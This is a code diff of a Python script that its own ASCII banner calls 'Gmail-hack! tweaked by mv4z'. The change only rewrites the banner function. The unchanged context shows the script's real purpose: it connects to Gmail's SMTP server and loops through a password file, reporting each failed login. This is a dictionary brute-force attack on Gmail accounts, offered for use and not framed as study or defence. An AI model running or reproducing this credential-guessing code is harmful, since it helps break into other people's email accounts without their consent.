@@ -4,30 +4,30 @@ import os
 from os import system
 
 def artwork():
-    print("\n")
-    print("##########################################################")
-    print("#                                                        #")
-    print("#                     \||/                               #")
-    print("#                     |  @___oo                          #")
-    print("#           /\  /\   / (__,,,,|                          #")
-    print("#          ) /^\) ^\/ _)                Gmail-hack!      #")
-    print("#          )   /^\/   _)            tweaked by mv4z      #")
-    print("#          )   _ /  / _)                                 #")
-    print("#      /\  )/\/ ||  | )_)                                #")
-    print("#     <  >      |(,,) )__)                               #")
-    print("#      ||      /    \)___)\                              #")
-    print("#      | \____(      )___) )___                          #")
-    print("#      \______(_______;;; __;;;                          #")
-    print("#                                                        #")
-    print("##########################################################")
-    print("\n")
+   return r"""
+##########################################################
+#                                                        #
+#                     \\\\                               #
+#                     |  @___oo                          #
+#           /\  /\   / (__,,,,|                          #
+#          ) /^\) ^\/ _)                Gmail-hack!      #
+#          )   /^\/   _)            tweaked by mv4z      #
+#          )   _ /  / _)                                 #
+#      /\  )/\/ ||  | )_)                                #
+#     <  >      |(,,) )__)                               #
+#      ||      /    \)___)\                              #
+#      | \____(      )___) )___                          #
+#      \______(_______;;; __;;;                          #
+#                                                        #
+##########################################################
+"""
     
 def cls():
  if os == "nt":    # windows is classified as "nt"
     os.system("cls")
 
 cls()
-artwork()
+print(artwork())
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 
 smtpserver.ehlo()
@@ -66,5 +66,3 @@ for password in passswfile:
 
     except smtplib.SMTPAuthenticationError:
         print("[!] Pasword Failure ❌. %s " % password)
-
-
